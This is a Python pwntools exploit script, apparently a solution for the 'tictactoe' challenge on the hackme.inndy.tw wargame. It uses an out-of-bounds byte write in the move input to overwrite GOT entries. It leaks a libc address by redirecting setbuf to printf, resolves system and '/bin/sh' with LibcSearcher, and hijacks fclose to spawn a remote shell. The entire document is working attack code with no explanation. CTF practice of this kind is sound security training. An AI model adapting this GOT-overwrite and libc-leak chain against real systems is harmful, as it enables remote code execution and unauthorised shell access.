#!/usr/bin/python

from pwn import *
from LibcSearcher import *

_start = 0x80485b0
base_write = 0x804b056

elf = ELF('./tictactoe')
puts_got = elf.got['puts']
fclose_got = elf.got['fclose']
setbuf_got = elf.got['setbuf']
printf_plt = elf.plt['printf']

def init():
    global s
    s.recvuntil('Play (1)st or (2)nd? ')
    s.sendline('1')
    s.recvuntil('Input move (9 to change flavor): ')
    s.sendline('1')

def write_byte(addr, byte):
    global base_write
    offset = addr - base_write

    s.recvuntil('Input move (9 to change flavor): ')
    s.sendline('9')
    s.send(p8(byte))
    s.recvuntil('Input move (9 to change flavor): ')
    s.sendline(str(offset))

def write_word(addr, value):
    init()
    write_byte(addr,    value&0x00ff)
    write_byte(addr+1,  value>>8)
    s.recvuntil('Input move (9 to change flavor): ')
    s.sendline('1000')
    s.recvuntil('Input move (9 to change flavor): ')
    s.sendline('1000')
    
def write_dword(addr, value):
    init()
    write_byte(addr,    value&0x000000ff)
    write_byte(addr+1,  (value&0x0000ff00)>>8)
    write_byte(addr+2,  (value&0x00ff0000)>>16)
    write_byte(addr+3,  (value&0xff000000)>>24)

config = '''
b *0x8048a64
b *0x8048530
b *0x8048b0a
'''
s = remote('hackme.inndy.tw', 7714)
#context.log_level = 'debug'
#s = process('./tictactoe')
#gdb.attach(s, config)

write_word(puts_got, 0x8048ae0&0x0000ffff)

write_dword(setbuf_got, printf_plt)
stdout = s.recvuntil('Try to beat my A.I. system')
stdout = u32(stdout[16:16+4])
stdout = stdout-71

libc = LibcSearcher('_IO_2_1_stdout_', stdout)
base = stdout - libc.dump('_IO_2_1_stdout_')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
log.success("stdout's address: " + hex(stdout))
log.success("system's address: " + hex(system))
log.success("binsh's address: " + hex(binsh))

write_dword(fclose_got, system)
write_dword(0x804b060, binsh)

s.interactive()
